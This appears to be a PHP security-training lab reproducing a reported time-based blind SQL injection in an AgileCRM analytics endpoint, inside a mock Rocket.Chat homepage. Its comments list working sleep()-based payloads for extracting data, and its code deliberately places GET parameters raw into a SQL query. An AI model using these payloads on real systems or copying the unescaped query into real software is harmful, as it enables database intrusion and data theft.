<?php
// ============================================================
// SQL Injection Lab 115 — Time-Based Blind SQLi via JSONP Analytics
// Platform: AgileCRM stats tracker on rocket.chat homepage
// HackerOne Report #433792
// Endpoint: GET /addstats?...&new={PAYLOAD}&...
// Vulnerability: `new` parameter interpolated raw into SQL WHERE clause
//
// Real endpoint: https://stats2.agilecrm.com/addstats
// Loading automatically on rocket.chat homepage as a <script> tag
//
// Payloads (intercept analytics request in Burp, modify `new=`):
//   new=0                                  → instant response (normal)
//   new=1                                  → instant response (new visitor)
//   new=(select*from(select(sleep(5)))a)   → 5-second delay = confirmed SQLi
//   new=IF(1=1,(select*from(select(sleep(5)))a),0) → TRUE  → delay
//   new=IF(1=2,(select*from(select(sleep(5)))a),0) → FALSE → instant
//   new=IF(MID((SELECT secret_data FROM lab115_secret LIMIT 1),1,1)=CHAR(102),(select*from(select(sleep(5)))a),0)
//                                          → delay if first char = 'f'
// ============================================================

$server   = "localhost";
$username = "root";
$password = "";
$database = "KrazePlanet_DB";

$conn = mysqli_connect($server, $username, $password);
if (!$conn) die(json_encode(["error" => "Connection failed"]));

mysqli_query($conn, "CREATE DATABASE IF NOT EXISTS $database");
mysqli_select_db($conn, $database);

function initializeLab115Database($conn) {
    mysqli_query($conn, "CREATE TABLE IF NOT EXISTS lab115_stats (
        id          INT AUTO_INCREMENT PRIMARY KEY,
        guid        VARCHAR(50)  NOT NULL,
        sid         VARCHAR(50)  NOT NULL,
        url         VARCHAR(255) NOT NULL,
        domain      VARCHAR(100) NOT NULL,
        new_visitor TINYINT(1)   NOT NULL DEFAULT 0,
        agile_key   VARCHAR(50)  NOT NULL,
        ref         VARCHAR(255) NOT NULL DEFAULT '',
        created_at  DATETIME     NOT NULL
    )");

    mysqli_query($conn, "CREATE TABLE IF NOT EXISTS lab115_secret (
        id          INT AUTO_INCREMENT PRIMARY KEY,
        secret_data VARCHAR(100) NOT NULL
    )");

    $check = mysqli_query($conn, "SELECT * FROM lab115_secret LIMIT 1");
    if (mysqli_num_rows($check) == 0) {
        mysqli_query($conn, "INSERT INTO lab115_secret (secret_data) VALUES ('flag{rocketchat_agilecrm_sqli_433792}')");
    }

    $checkStats = mysqli_query($conn, "SELECT COUNT(*) AS c FROM lab115_stats");
    $row = mysqli_fetch_assoc($checkStats);
    if ((int)$row['c'] === 0) {
        mysqli_query($conn, "INSERT INTO lab115_stats (guid, sid, url, domain, new_visitor, agile_key, ref, created_at) VALUES
            ('a1b2c3d4-e5f6-7890-abcd-ef1234567890', 'f0d3738c-44c0-60a6-44b6-56e14ca30871', 'https://rocket.chat/', 'rocket.chat', 1, '8pat9ou8gh0thqd8dlgctje3go', '', '2018-11-01 08:12:34'),
            ('b2c3d4e5-f6a7-8901-bcde-f01234567891', 'a1b2c3d4-e5f6-7890-abcd-ef1234567891', 'https://rocket.chat/', 'rocket.chat', 0, '8pat9ou8gh0thqd8dlgctje3go', 'https://google.com/', '2018-11-01 09:05:11'),
            ('c3d4e5f6-a7b8-9012-cdef-012345678902', 'b2c3d4e5-f6a7-8901-bcde-f01234567892', 'https://rocket.chat/pricing', 'rocket.chat', 0, '8pat9ou8gh0thqd8dlgctje3go', 'https://rocket.chat/', '2018-11-01 10:22:47'),
            ('d4e5f6a7-b8c9-0123-def0-123456789013', 'c3d4e5f6-a7b8-9012-cdef-012345678903', 'https://rocket.chat/', 'rocket.chat', 1, '8pat9ou8gh0thqd8dlgctje3go', 'https://github.com/', '2018-11-01 11:18:03'),
            ('e5f6a7b8-c9d0-1234-ef01-234567890124', 'd4e5f6a7-b8c9-0123-def0-123456789014', 'https://rocket.chat/features', 'rocket.chat', 0, '8pat9ou8gh0thqd8dlgctje3go', '', '2018-11-01 12:44:55'),
            ('f6a7b8c9-d0e1-2345-f012-345678901235', 'e5f6a7b8-c9d0-1234-ef01-234567890125', 'https://rocket.chat/', 'rocket.chat', 1, '8pat9ou8gh0thqd8dlgctje3go', 'https://twitter.com/', '2018-11-02 07:33:21'),
            ('a7b8c9d0-e1f2-3456-0123-456789012346', 'f6a7b8c9-d0e1-2345-f012-345678901236', 'https://rocket.chat/', 'rocket.chat', 0, '8pat9ou8gh0thqd8dlgctje3go', '', '2018-11-02 09:11:08'),
            ('b8c9d0e1-f2a3-4567-1234-567890123457', 'a7b8c9d0-e1f2-3456-0123-456789012347', 'https://rocket.chat/marketplace', 'rocket.chat', 1, '8pat9ou8gh0thqd8dlgctje3go', 'https://rocket.chat/', '2018-11-02 14:02:39'),
            ('c9d0e1f2-a3b4-5678-2345-678901234568', 'b8c9d0e1-f2a3-4567-1234-567890123458', 'https://rocket.chat/', 'rocket.chat', 0, '8pat9ou8gh0thqd8dlgctje3go', 'https://linkedin.com/', '2018-11-03 08:55:17'),
            ('d0e1f2a3-b4c5-6789-3456-789012345679', 'c9d0e1f2-a3b4-5678-2345-678901234569', 'https://rocket.chat/', 'rocket.chat', 1, '8pat9ou8gh0thqd8dlgctje3go', '', '2018-11-03 11:47:50')");
    }
}
initializeLab115Database($conn);

// ============================================================
// JSONP ANALYTICS ENDPOINT
// Triggered by: GET index.php?addstats&callback=json{n}&...&new={payload}&...
// ⚠ `new` is injected raw into SQL — time-based blind via sleep()
// ============================================================
if (isset($_GET['addstats'])) {
    $callback = preg_replace('/[^a-zA-Z0-9_]/', '', $_GET['callback'] ?? 'callback');
    $domain   = $_GET['domain']   ?? '';
    $new      = $_GET['new']      ?? '0';   // ⚠ VULNERABLE — raw in SQL

    // ====================================================================
    // ⚠ VULNERABLE QUERY — `new` GET parameter interpolated raw into SQL
    //   WHERE new_visitor = {new}
    //
    // Injection point: ?addstats&...&new=[HERE]&...
    //
    // Payload: (select*from(select(sleep(5)))a)
    //   → WHERE new_visitor = (select*from(select(sleep(5)))a)
    //   → MySQL evaluates sleep(5) → 5-second delay before response
    //
    // Payload: IF(1=1,(select*from(select(sleep(5)))a),0)
    //   → delay only when condition is TRUE (boolean extraction)
    // ====================================================================
    $sql = "SELECT COUNT(*) AS cnt FROM lab115_stats
            WHERE domain = '$domain' AND new_visitor = $new";

    mysqli_query($conn, $sql);  // result ignored — delay is the signal

    header('Content-Type: application/javascript; charset=utf-8');
    header('Access-Control-Allow-Origin: *');
    echo $callback . '({"status":"ok"})';
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Rocket.Chat — The Ultimate Open Source Team Communication</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#1C1C1E;color:#fff;min-height:100vh;display:flex;flex-direction:column;}

/* ── Nav ─────────────────────────────────────────────────────────────────── */
.nav{background:#1C1C1E;border-bottom:1px solid rgba(255,255,255,.08);height:60px;display:flex;align-items:center;width:100%;position:sticky;top:0;z-index:100;}
.nav-inner{max-width:1200px;margin:0 auto;padding:0 24px;width:100%;display:flex;align-items:center;gap:0;}
.nav-logo{display:flex;align-items:center;gap:10px;text-decoration:none;flex-shrink:0;}
.nav-logo-icon{width:32px;height:32px;}
.nav-logo-text{font-size:1.15rem;font-weight:700;color:#fff;letter-spacing:-.02em;}
.nav-links{display:flex;gap:0;margin-left:32px;}
.nav-link{color:rgba(255,255,255,.65);font-size:.82rem;font-weight:500;text-decoration:none;padding:0 14px;line-height:60px;transition:color .15s;white-space:nowrap;}
.nav-link:hover{color:#fff;}
.nav-right{margin-left:auto;display:flex;align-items:center;gap:10px;}
.btn-login{color:rgba(255,255,255,.75);font-size:.82rem;font-weight:600;text-decoration:none;padding:7px 16px;border-radius:4px;border:1px solid rgba(255,255,255,.2);transition:all .15s;}
.btn-login:hover{border-color:rgba(255,255,255,.5);color:#fff;}
.btn-signup{background:#F5455C;color:#fff;font-size:.82rem;font-weight:700;text-decoration:none;padding:7px 16px;border-radius:4px;transition:background .15s;}
.btn-signup:hover{background:#e03550;}

/* ── Hero ────────────────────────────────────────────────────────────────── */
.hero{flex:0 0 auto;padding:80px 24px 60px;text-align:center;background:linear-gradient(180deg,#1C1C1E 0%,#242428 100%);}
.hero-eyebrow{font-size:.72rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:#F5455C;margin-bottom:20px;}
.hero-title{font-size:3rem;font-weight:800;line-height:1.12;letter-spacing:-.04em;color:#fff;max-width:720px;margin:0 auto 20px;}
.hero-title em{font-style:normal;background:linear-gradient(90deg,#F5455C,#f87171);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
.hero-subtitle{font-size:1.05rem;color:rgba(255,255,255,.6);max-width:520px;margin:0 auto 36px;line-height:1.6;}
.hero-actions{display:flex;align-items:center;justify-content:center;gap:14px;flex-wrap:wrap;}
.btn-hero-primary{background:#F5455C;color:#fff;font-size:.9rem;font-weight:700;text-decoration:none;padding:12px 28px;border-radius:6px;transition:background .15s;display:inline-flex;align-items:center;gap:8px;}
.btn-hero-primary:hover{background:#e03550;}
.btn-hero-secondary{background:rgba(255,255,255,.08);color:#fff;font-size:.9rem;font-weight:600;text-decoration:none;padding:12px 24px;border-radius:6px;border:1px solid rgba(255,255,255,.15);transition:all .15s;display:inline-flex;align-items:center;gap:8px;}
.btn-hero-secondary:hover{background:rgba(255,255,255,.13);border-color:rgba(255,255,255,.3);}
.btn-hero-secondary svg{width:16px;height:16px;flex-shrink:0;}

/* ── Stats bar ───────────────────────────────────────────────────────────── */
.stats-bar{background:rgba(255,255,255,.04);border-top:1px solid rgba(255,255,255,.08);border-bottom:1px solid rgba(255,255,255,.08);padding:20px 24px;}
.stats-bar-inner{max-width:900px;margin:0 auto;display:flex;align-items:center;justify-content:space-around;flex-wrap:wrap;gap:16px;}
.stat-item{text-align:center;}
.stat-num{font-size:1.5rem;font-weight:800;color:#F5455C;letter-spacing:-.03em;}
.stat-label{font-size:.72rem;color:rgba(255,255,255,.5);margin-top:2px;font-weight:500;}

/* ── Features ────────────────────────────────────────────────────────────── */
.features{padding:60px 24px;}
.features-inner{max-width:1100px;margin:0 auto;}
.features-title{font-size:1.5rem;font-weight:700;text-align:center;color:#fff;margin-bottom:40px;letter-spacing:-.03em;}
.features-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:20px;}
.feat-card{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.08);border-radius:10px;padding:22px 20px;}
.feat-icon{width:36px;height:36px;background:rgba(245,69,92,.15);border-radius:8px;display:flex;align-items:center;justify-content:center;margin-bottom:14px;}
.feat-icon svg{width:18px;height:18px;stroke:#F5455C;fill:none;stroke-width:2;}
.feat-name{font-size:.88rem;font-weight:700;color:#fff;margin-bottom:5px;}
.feat-desc{font-size:.75rem;color:rgba(255,255,255,.5);line-height:1.55;}

/* ── Trusted by ──────────────────────────────────────────────────────────── */
.trusted{padding:40px 24px;border-top:1px solid rgba(255,255,255,.08);}
.trusted-inner{max-width:900px;margin:0 auto;text-align:center;}
.trusted-label{font-size:.72rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:rgba(255,255,255,.35);margin-bottom:20px;}
.trusted-logos{display:flex;align-items:center;justify-content:center;flex-wrap:wrap;gap:28px;}
.trusted-logo{font-size:.82rem;font-weight:700;color:rgba(255,255,255,.3);letter-spacing:-.01em;}

/* ── CTA band ────────────────────────────────────────────────────────────── */
.cta-band{background:linear-gradient(135deg,#F5455C 0%,#c2185b 100%);padding:48px 24px;text-align:center;}
.cta-title{font-size:1.6rem;font-weight:800;color:#fff;margin-bottom:10px;letter-spacing:-.03em;}
.cta-sub{font-size:.9rem;color:rgba(255,255,255,.8);margin-bottom:28px;}
.btn-cta{background:#fff;color:#F5455C;font-size:.88rem;font-weight:800;text-decoration:none;padding:12px 28px;border-radius:6px;transition:opacity .15s;display:inline-block;}
.btn-cta:hover{opacity:.9;}

/* ── Footer ──────────────────────────────────────────────────────────────── */
.footer{background:#111113;border-top:1px solid rgba(255,255,255,.08);padding:24px;margin-top:auto;}
.footer-inner{max-width:1200px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;}
.footer-copy{font-size:.72rem;color:rgba(255,255,255,.35);}
.footer-links{display:flex;gap:16px;}
.footer-links a{font-size:.72rem;color:rgba(255,255,255,.35);text-decoration:none;transition:color .15s;}
.footer-links a:hover{color:rgba(255,255,255,.7);}
</style>
</head>
<body>

<!-- Navigation -->
<nav class="nav">
  <div class="nav-inner">
    <a href="index.php" class="nav-logo">
      <!-- Rocket.Chat logo mark -->
      <svg class="nav-logo-icon" viewBox="0 0 100 100" fill="none">
        <circle cx="50" cy="50" r="50" fill="#F5455C"/>
        <path d="M50 20C32.327 20 18 32.536 18 48C18 54.418 20.418 60.327 24.582 65.091L18 82L35.345 76.218C39.782 78.218 44.764 79.333 50 79.333C67.673 79.333 82 66.797 82 51.333C82 35.87 67.673 20 50 20Z" fill="white"/>
        <circle cx="38" cy="50" r="4" fill="#F5455C"/>
        <circle cx="50" cy="50" r="4" fill="#F5455C"/>
        <circle cx="62" cy="50" r="4" fill="#F5455C"/>
      </svg>
      <span class="nav-logo-text">Rocket.Chat</span>
    </a>
    <div class="nav-links">
      <a href="#" class="nav-link">Features</a>
      <a href="#" class="nav-link">Marketplace</a>
      <a href="#" class="nav-link">Pricing</a>
      <a href="#" class="nav-link">Enterprise</a>
      <a href="#" class="nav-link">Docs</a>
    </div>
    <div class="nav-right">
      <a href="#" class="btn-login">Log in</a>
      <a href="#" class="btn-signup">Get started free</a>
    </div>
  </div>
</nav>

<!-- Hero -->
<section class="hero">
  <div class="hero-eyebrow">Open Source Communications</div>
  <h1 class="hero-title">The <em>Ultimate</em> Open Source<br>Team Communication Platform</h1>
  <p class="hero-subtitle">Replace email, HipChat &amp; Slack with the ultimate open source platform for your team communications — fully customisable and self-hosted.</p>
  <div class="hero-actions">
    <a href="#" class="btn-hero-primary">Get started free &rarr;</a>
    <a href="#" class="btn-hero-secondary">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.418 2.865 8.166 6.839 9.489.5.092.682-.217.682-.482 0-.237-.008-.866-.013-1.7-2.782.604-3.369-1.341-3.369-1.341-.454-1.155-1.11-1.463-1.11-1.463-.908-.62.069-.608.069-.608 1.003.07 1.531 1.03 1.531 1.03.892 1.529 2.341 1.087 2.91.832.092-.647.35-1.087.636-1.337-2.22-.253-4.555-1.11-4.555-4.943 0-1.091.39-1.984 1.029-2.682-.103-.253-.446-1.27.098-2.647 0 0 .84-.269 2.75 1.025A9.578 9.578 0 0112 6.836c.85.004 1.705.114 2.504.336 1.909-1.294 2.747-1.025 2.747-1.025.546 1.377.202 2.394.1 2.647.64.698 1.028 1.591 1.028 2.682 0 3.841-2.337 4.687-4.565 4.935.359.309.678.919.678 1.852 0 1.336-.012 2.415-.012 2.741 0 .267.18.578.688.48C19.138 20.163 22 16.418 22 12c0-5.523-4.477-10-10-10z"/></svg>
      View on GitHub
    </a>
  </div>
</section>

<!-- Stats Bar -->
<div class="stats-bar">
  <div class="stats-bar-inner">
    <div class="stat-item"><div class="stat-num">12M+</div><div class="stat-label">Users worldwide</div></div>
    <div class="stat-item"><div class="stat-num">800+</div><div class="stat-label">Contributors</div></div>
    <div class="stat-item"><div class="stat-num">150+</div><div class="stat-label">Countries</div></div>
    <div class="stat-item"><div class="stat-num">35K+</div><div class="stat-label">Community servers</div></div>
    <div class="stat-item"><div class="stat-num">100%</div><div class="stat-label">Open source</div></div>
  </div>
</div>

<!-- Features -->
<section class="features">
  <div class="features-inner">
    <h2 class="features-title">Everything your team needs</h2>
    <div class="features-grid">
      <div class="feat-card">
        <div class="feat-icon"><svg viewBox="0 0 24 24"><path d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"/></svg></div>
        <div class="feat-name">Team Messaging</div>
        <div class="feat-desc">Channels, direct messages, and threads for all your conversations.</div>
      </div>
      <div class="feat-card">
        <div class="feat-icon"><svg viewBox="0 0 24 24"><path d="M15 10l4.553-2.069A1 1 0 0121 8.87v6.26a1 1 0 01-1.447.894L15 14M3 8a2 2 0 012-2h10a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z"/></svg></div>
        <div class="feat-name">Video Conferencing</div>
        <div class="feat-desc">Built-in video and voice calling with screen sharing.</div>
      </div>
      <div class="feat-card">
        <div class="feat-icon"><svg viewBox="0 0 24 24"><path d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg></div>
        <div class="feat-name">File Sharing</div>
        <div class="feat-desc">Share files, images, and documents seamlessly within channels.</div>
      </div>
      <div class="feat-card">
        <div class="feat-icon"><svg viewBox="0 0 24 24"><path d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"/><path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/></svg></div>
        <div class="feat-name">Integrations</div>
        <div class="feat-desc">Connect with 500+ apps via the Rocket.Chat Marketplace.</div>
      </div>
      <div class="feat-card">
        <div class="feat-icon"><svg viewBox="0 0 24 24"><path d="M3 15a4 4 0 004 4h9a5 5 0 10-.1-9.999 5.002 5.002 0 10-9.78 2.096A4.001 4.001 0 003 15z"/></svg></div>
        <div class="feat-name">Self-Hosted</div>
        <div class="feat-desc">Host on your own servers for complete data ownership and privacy.</div>
      </div>
      <div class="feat-card">
        <div class="feat-icon"><svg viewBox="0 0 24 24"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg></div>
        <div class="feat-name">End-to-End Encryption</div>
        <div class="feat-desc">Enterprise-grade security with optional E2E encryption for messages.</div>
      </div>
    </div>
  </div>
</section>

<!-- Trusted by -->
<div class="trusted">
  <div class="trusted-inner">
    <div class="trusted-label">Trusted by teams at</div>
    <div class="trusted-logos">
      <span class="trusted-logo">NASA</span>
      <span class="trusted-logo">Deutsche Bahn</span>
      <span class="trusted-logo">Airbus</span>
      <span class="trusted-logo">Renault</span>
      <span class="trusted-logo">US Navy</span>
      <span class="trusted-logo">Credit Suisse</span>
      <span class="trusted-logo">Decathlon</span>
    </div>
  </div>
</div>

<!-- CTA Band -->
<div class="cta-band">
  <h2 class="cta-title">Start communicating smarter today</h2>
  <p class="cta-sub">Join millions of users on the world's most customisable messaging platform.</p>
  <a href="#" class="btn-cta">Get started free &rarr;</a>
</div>

<!-- Footer -->
<footer class="footer">
  <div class="footer-inner">
    <span class="footer-copy">&copy; <?= date('Y') ?> Rocket.Chat Technologies Corp. &nbsp;&middot;&nbsp; stats2.agilecrm.com &nbsp;&middot;&nbsp; AgileCRM Analytics</span>
    <div class="footer-links">
      <a href="https://hackerone.com/reports/433792" target="_blank" rel="noopener">HackerOne #433792</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
    </div>
  </div>
</footer>

<script>
// AgileCRM stats tracker — auto-fires on every page load (like the real rocket.chat site)
// Students intercept this request in Burp Suite and modify the `new=` parameter
// Injection point: ?addstats&...&new=[HERE]&...
(function() {
  function uuid() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      var r = Math.random() * 16 | 0;
      return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
    });
  }
  var _n  = Math.floor(Math.random() * 1e16);
  var src = 'index.php?addstats'
          + '&callback=json' + _n
          + '&guid=' + uuid()
          + '&sid='  + uuid()
          + '&url='  + encodeURIComponent('https://rocket.chat/')
          + '&agile=8pat9ou8gh0thqd8dlgctje3go'
          + '&new=0'
          + '&ref='
          + '&domain=rocket.chat';
  var s = document.createElement('script');
  s.src = src;
  s.async = true;
  document.head.appendChild(s);
})();
</script>

</body>
</html>
